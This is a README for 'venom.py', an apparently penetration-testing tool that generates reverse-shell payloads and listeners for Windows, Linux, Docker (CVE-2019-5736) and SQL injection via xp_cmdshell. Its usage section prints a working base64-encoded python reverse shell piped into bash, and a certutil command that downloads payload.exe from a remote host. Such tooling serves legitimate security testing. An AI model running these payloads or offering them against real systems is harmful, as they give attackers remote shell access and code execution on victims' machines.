# venom

A **quick** way to manage various payloads and listeners.

<p align="center">
    <img src="https://i.imgur.com/r58vNrZ.jpg" alt="venom logo" width="300" height="400" />
</p>

## Summary

venom.py is a tool that help you manage payloads and listeners.

```sh
⬢  venom  ./venom.py

 ▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.
▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪
▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·
 ███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌
. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀
Simplifies payload creation and listener.

  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64    <LHOST> <LPORT>  |   x64 Windows payload
    win32    <LHOST> <LPORT>  |   x32 Windows payload
    lin64    <LHOST> <LPORT>  |   x64 Linux payload
    lin32    <LHOST> <LPORT>  |   x32 Linux payload
    mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
    mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
    dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload
    dockerb  <LHOST> <LPORT>  |   cve-2019-5736 docker compiled payload
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    python   <LHOST> <LPORT>  |   python reverse_tcp payload
    python2  <LHOST> <LPORT>  |   python2 reverse_tcp payload
    python3  <LHOST> <LPORT>  |   python3 reverse_tcp payload
    bash     <LHOST> <LPORT>  |   bash reverse_tcp payload
    ncbash   <LHOST> <LPORT>  |   nc bash combined reverse_tcp payload
    b64py    <LHOST> <LPORT>  |   base64 encoded python payload
    b64py2   <LHOST> <LPORT>  |   base64 encoded python2 payload
    b64py3   <LHOST> <LPORT>  |   base64 encoded python3 payload
    nc       <LHOST> <LPORT>  |   np reverse_tcp payload
  <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    winhttp  <LHOST> <LPORT>  |    windows download and execute
    windl    <LHOST> <LPORT>  |    windows download file
    wincert  <LHOST> <LPORT>  |    windows download file with certutil
    winup    <LHOST> <LPORT>  |    windows webdav file upload
                              |
  <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    xpcmdi   exec <COMMAND>   |    Output xp_cmdshell sqli payload
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64s   <LHOST> <LPORT>  |   x64 Windows meterpreter listen
    win32s   <LHOST> <LPORT>  |   x32 Windows meterpreter listen
    lin64s   <LHOST> <LPORT>  |   x64 Linux meterpreter listen
    lin32s   <LHOST> <LPORT>  |   x32 Linux meterpreter listen
    pythons  <LHOST> <LPORT>  |   python listener
    ncs      <LHOST> <LPORT>  |   netcat listener
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Advanced]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    mperl64  <LHOST> <LPORT>  |   x64 Linux elf memory inject binary
    mperl32  <LHOST> <LPORT>  |   x32 Linux elf memory inject binary
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~[Misc]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    httpsrv  <HOST>  <PORT>   |  Http server listen in current dir
    phpsrv   <HOST>  <PORT>   |  Php server listen in current dir
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

```

## Usage

Setup a python listener.

```sh
⬢  venom  venom.py pythons 0.0.0.0 4444
Waiting for connection on 0.0.0.0:4444
```

Gives you a base64 encoded bython payload that will connect back to your listener.

```sh
venom.py b64py xx.xx.xx 4444
echo cHl0aG9uIC1jICdpbXBvcnQgcHR5LHNvY2tldCxvcztzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIHMuY29ubmVjdCgoIjEyNy4wLjAuMSIsIDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL2Jhc2giKTtzLmNsb3NlKCkn|base64 -d|bash

```

venom now supports add interface name instead of the full ip for LHOST as this is more conviniet and save some keystrokes.

```sh
⬢  venom  master ⦿ ./venom.py wincert tap0 1337

certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx:1337/payload.exe


```


**This content was created by Kindred Group Security. Please share if you enjoyed!**